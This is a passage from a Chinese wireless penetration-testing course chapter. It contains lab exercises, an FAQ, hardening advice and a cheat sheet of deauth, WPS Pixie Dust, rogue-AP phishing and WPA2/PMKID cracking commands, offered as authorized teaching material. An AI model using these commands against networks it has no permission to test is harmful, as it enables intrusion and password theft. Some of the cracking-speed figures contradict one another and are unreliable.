VLAN 30: IoT 设备（受限访问）
VLAN 40: 管理设备（仅 IT 部门）
```

### 6.3 蓝牙安全加固

```
✅ 推荐措施：
  1. 不使用时关闭蓝牙
  2. 设置为"不可发现"模式
  3. 及时安装蓝牙固件更新
  4. 使用蓝牙 5.0+ 设备（安全增强）
  5. 避免 Pairing 时使用简单 PIN（如 0000、1234）
  6. 使用 LE Secure Connections（BLE 4.2+）

❌ 避免：
  - 在公共场所保持蓝牙可发现
  - 使用旧版蓝牙（2.0/2.1）
  - 接受未知设备的 Pairing 请求
```

---

## 七、课后练习

### 练习 1：无线网络扫描与信息收集

**任务**：使用 `airodump-ng` 扫描周围无线网络，记录以下信息：

- 至少 5 个 AP 的 BSSID、ESSID、信道、加密方式
- 识别使用 WEP 加密的网络（如有）
- 识别开启 WPS 的网络

**提交**：扫描结果截图 + 分析报告

---

### 练习 2：WPA2 握手捕获

**任务**：

1. 搭建一个 WPA2-PSK 测试网络（密码：TestWiFi123）
2. 使用 `airodump-ng` 监听并捕获 4 次握手
3. 使用 `aircrack-ng` 字典破解密码

**提示**：可以使用 `crunch` 生成定制字典，或使用 `hashcat` 加速破解。

**提交**：握手包文件（.cap）+ 破解结果截图

---

### 练习 3：WPS 漏洞测试

**任务**：

1. 使用 `wash` 扫描支持 WPS 的 AP
2. 选择一个目标（或搭建测试环境）
3. 使用 `reaver` 或 `bully` 尝试获取 WPS PIN

**注意**：如果使用真实路由器测试，请确保是**自己的设备**。

**提交**：测试报告（包含 WPS 状态、攻击过程、结果）

---

### 练习 4：Evil Twin 攻击模拟

**任务**：

1. 使用 `hostapd` 创建伪造 AP
2. 配置 `dnsmasq` 提供 DHCP 服务
3. 部署简单钓鱼页面（提示用户输入 WiFi 密码）
4. 使用另一台设备连接伪造 AP 并观察结果

**提交**：网络拓扑图 + 配置文件 + 钓鱼页面截图

---

### 练习 5：无线安全加固方案设计

**任务**：为一家 50 人规模的中小企业设计无线安全方案，包括：

- 加密方式选择（WPA2-Enterprise vs WPA3-Personal）
- 认证服务器部署（RADIUS）
- 访客网络隔离
- 入侵检测系统（WIDS）部署
- 员工安全意识培训计划

**提交**：安全方案文档（Markdown 格式，1000+ 字）

---

### 练习 6：蓝牙安全测试（进阶）

**任务**：

1. 使用 `hcitool` 扫描周围蓝牙设备
2. 使用 `bettercap` 的 BLE 模块扫描 BLE 设备
3. 尝试读取未加密 BLE 设备的 GATT 特征值

**提交**：扫描结果 + 设备信息分析报告

---

## 八、FAQ（常见问题解答）

### Q1：破解 WPA2 需要多长时间？

**A**：取决于以下因素：

- **密码复杂度**：8 位纯数字约 10 秒，8 位混合字符约数天到数月
- **GPU 性能**：RTX 4090 约 300,000 hashes/sec，RTX 3060 约 50,000 hashes/sec
- **字典质量**：好的字典（如 rockyou.txt）可覆盖 90% 的常见密码

```
时间估算（RTX 3080, WPA2）：
  8 位数字              → 约 3 秒
  8 位小写字母          → 约 7 小时
  8 位混合字符          → 约 500 年（理论上）
  常见密码（rockyou）   → 约 1 分钟
```

> **注意**：WPA3 的 SAE 协议使离线字典攻击几乎不可行（每次猜测需要与 AP 交互）。

---

### Q2：Deauth 攻击是否违法？

**A**：在大多数国家和地区，**未经授权**对他人网络发送 Deauth 帧属于违法行为（干扰无线电通信）。

**合法场景**：
- 自己的网络
- 获得书面授权的渗透测试
- 企业内部的红队演练

**建议**：始终在合法授权范围内操作，并保留授权文件备查。

---

### Q3：为什么我的网卡不支持监听模式？

**A**：监听模式需要网卡硬件和驱动程序的支持。常见兼容芯片组：

| 芯片组 | 监听模式 | 注入 | 推荐度 |
|--------|---------|------|--------|
| Atheros AR9271 | ✅ | ✅ | ⭐⭐⭐⭐⭐ |
| Realtek RTL8812AU | ✅ | ✅ | ⭐⭐⭐⭐ |
| Ralink RT3070 | ✅ | ✅ | ⭐⭐⭐⭐ |
| Intel AX200/AX210 | ⚠️ 部分支持 | ❌ | ⭐⭐ |
| Broadcom BCM43xx | ❌ | ❌ | ⭐ |

**解决方案**：购买兼容的外置 USB 无线网卡（如 Alfa AWUS036NHA）。

---

### Q4：PMKID 攻击和 4-Way Handshake 攻击有什么区别？

**A**：

| 特性 | 4-Way Handshake | PMKID |
|------|-----------------|-------|
| 是否需要客户端在线 | ✅ 是 | ❌ 否 |
| 是否需要 Deauth | ✅ 是（如无活跃客户端） | ❌ 否 |
| 攻击复杂度 | 中等 | 低 |
| 成功率 | 依赖握手捕获 | 依赖 AP 实现 |
| hashcat 模式 | 2500 | 22000 |

**推荐**：优先尝试 PMKID 攻击（更快、更隐蔽），如失败再使用 4-Way Handshake 攻击。

---

### Q5：Evil Twin 攻击如何防范？

**A**：客户端侧防范措施：

1. **验证证书**：在连接 WPA2-Enterprise 网络时，验证 RADIUS 服务器证书
2. **手动配置网络**：不要使用"自动连接"功能
3. **使用 VPN**：即使连接到恶意 AP，VPN 加密可保护数据
4. **检查 BSSID**：对比已知合法 AP 的 MAC 地址

企业侧防范措施：

1. **部署 WIDS**：检测 Rogue AP
2. **使用 802.11w（Protected Management Frames）**：防止 Deauth 攻击
3. **证书绑定**：WPA2-Enterprise 中强制验证服务器证书

---

### Q6：蓝牙攻击的有效距离是多少？

**A**：

| 蓝牙版本 | 理论距离 | 实际攻击距离 |
|---------|---------|-------------|
| Bluetooth 2.0/2.1 | 10 米 | 10–50 米（高增益天线） |
| Bluetooth 4.0/4.1 (BLE) | 100 米 | 100–300 米 |
| Bluetooth 5.0+ | 400 米 | 400–1000 米 |

**注意**：BlueBorne 攻击在**无需配对**的情况下即可触发，有效距离与正常蓝牙通信相同。

---

### Q7：如何检测自己是否被 Deauth 攻击？

**A**：症状：

- WiFi 频繁断开后自动重连
- 同一时刻多个设备同时断开
- 使用 `airodump-ng` 看到大量 Deauth 帧

检测方法：

```bash
# 使用 Wireshark 过滤 Deauth 帧
wlan.fc.type_subtype == 0x0c

# 使用 tshark 实时检测
sudo tshark -i mon0 -Y "wlan.fc.type_subtype == 0x0c" -T fields -e wlan.sa -e wlan.da
```

---

### Q8：WPA3 真的安全吗？

**A**：WPA3 在安全性上有显著提升，但**并非完美**：

**优势**：
- SAE 防止离线字典攻击
- Forward Secrecy 保护历史流量
- Protected Management Frames 防止 Deauth

**已知问题**：
- **Downgrade 攻击**：攻击者可能迫使客户端降级到 WPA2
- **侧信道攻击**：部分 SAE 实现存在计时攻击漏洞（CVE-2019-9494）
- **过渡模式风险**：WPA3 过渡模式（同时支持 WPA2/WPA3）可能被降级攻击

**建议**：使用**纯 WPA3 模式**（不支持过渡模式），并确保客户端设备支持 WPA3。

---

## 九、总结

本章节深入探讨了无线网络安全的多个层面，从协议原理到实战攻击，再到防御加固。以下是核心要点总结：

### 9.1 知识体系回顾

```
无线网络基础
  ├── 802.11 协议族（a/b/g/n/ac/ax）
  ├── 频段与信道（2.4 GHz / 5 GHz / 6 GHz）
  ├── 帧类型（管理帧 / 控制帧 / 数据帧）
  └── 加密演进（WEP → WPA → WPA2 → WPA3）

攻击技术
  ├── WEP 破解（PTW 攻击，需 40,000+ IV）
  ├── WPA/WPA2 破解（4-Way Handshake + 字典攻击）
  ├── WPS 攻击（Pixie Dust，利用弱 PRNG）
  ├── Evil Twin（伪造 AP + 钓鱼 + MITM）
  └── 蓝牙攻击（BlueBorne、BLE 嗅探）

防御措施
  ├── 强密码策略（≥16 字符，复杂组合）
  ├── 升级 WPA3（SAE + Forward Secrecy）
  ├── 禁用 WPS（防止 PIN 暴力破解）
  ├── 客户端隔离（防止内网横向移动）
  ├── WIDS/WIPS（检测 Rogue AP 和攻击）
  └── 员工安全培训（识别钓鱼、安全配置）
```

### 9.2 实战技能清单

完成本章后，你应该能够：

- ✅ 使用 `airodump-ng` 扫描并分析无线网络
- ✅ 使用 `aireplay-ng` 执行 Deauth 和注入攻击
- ✅ 捕获 WPA/WPA2 握手并使用 `aircrack-ng` / `hashcat` 破解
- ✅ 使用 `reaver` / `bully` 利用 WPS 漏洞
- ✅ 搭建 Evil Twin 钓鱼环境（`hostapd` + `dnsmasq`）
- ✅ 使用 `bettercap` 执行无线 MITM 攻击
- ✅ 为家庭/企业网络设计无线安全加固方案

### 9.3 进一步学习资源

**工具文档**：
- [Aircrack-ng 官方文档](https://www.aircrack-ng.org/documentation.html)
- [Hashcat 攻击模式详解](https://hashcat.net/wiki/)
- [Bettercap 官方文档](https://www.bettercap.org/)

**学术论文**：
- "Breaking WEP in a Few Minutes" (Beck, Tews, 2009)
- "Practical Attacks Against WPA2" (Ohigashi et al., 2013)
- "Off-Path Hacking: The Relay Vulnerability in WPA2" (Ron, 2017)

**实战平台**：
- **Hack The Box**：提供真实渗透测试场景
- **TryHackMe**：无线安全学习路径
- **PentesterLab**：WPA2 破解练习环境

**开源项目**：
- [hcxtools](https://github.com/ZerBea/hcxtools)：PMKID 攻击工具集
- [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)：自动化无线攻击框架
- [Wifiphisher](https://github.com/wifiphisher/wifiphisher)：自动化 Evil Twin 攻击工具

### 9.4 安全研究者守则

作为网络安全从业者，我们肩负着保护数字世界的责任。请始终遵守以下原则：

1. **授权优先**：任何渗透测试必须在书面授权范围内进行
2. **最小影响**：攻击测试应尽量避免对生产环境造成影响
3. **数据保护**：捕获的握手包、密码等敏感信息应妥善加密存储
4. **知识分享**：将技能用于防御，帮助他人提升安全意识
5. **持续学习**：无线技术不断演进，保持对新漏洞和防御技术的研究

> **红客精神**："以攻促防，以技护卫。"我们学习攻击技术，是为了更好地防御，而非滥用。

---

## 附录：常用命令速查表

### A. 监听模式管理

```bash
sudo airmon-ng check kill              # 结束干扰进程
sudo airmon-ng start wlan0            # 启用监听模式
sudo airmon-ng stop mon0              # 停止监听模式
sudo iwconfig mon0 channel 6          # 切换信道
```

### B. 网络扫描

```bash
sudo airodump-ng mon0                          # 扫描所有网络
sudo airodump-ng -c 6 --bssid XX mon0          # 锁定目标
sudo wash -i mon0                               # WPS 扫描
sudo hcitool scan                               # 蓝牙扫描
```

### C. 攻击命令

```bash
sudo aireplay-ng -0 5 -a AP -c CLIENT mon0     # Deauth
sudo aireplay-ng -3 -b AP -h CLIENT mon0       # ARP 注入
sudo reaver -i mon0 -b AP -K 1 -vvv           # Pixie Dust
sudo hostapd /etc/hostapd.conf                 # 启动伪造 AP
```

### D. 破解命令

```bash
sudo aircrack-ng -w dict.txt capture.cap        # aircrack 字典
hashcat -m 2500 hash.hccapx dict.txt           # hashcat WPA
hashcat -m 22000 pmkid.hash dict.txt           # hashcat PMKID
john --wordlist=dict.txt hash.txt              # John the Ripper
```

---

**文档版本**：v1.0　|　**最后更新**：2026-06-12　|　**作者**：红客教学团队

---

> 🎓 **下一章预告**：第 16 章《移动应用安全》将深入探讨 Android/iOS 应用逆向、Hook 框架（Frida/Xposed）、SSL Pinning 绕过等移动安全核心技术。

---
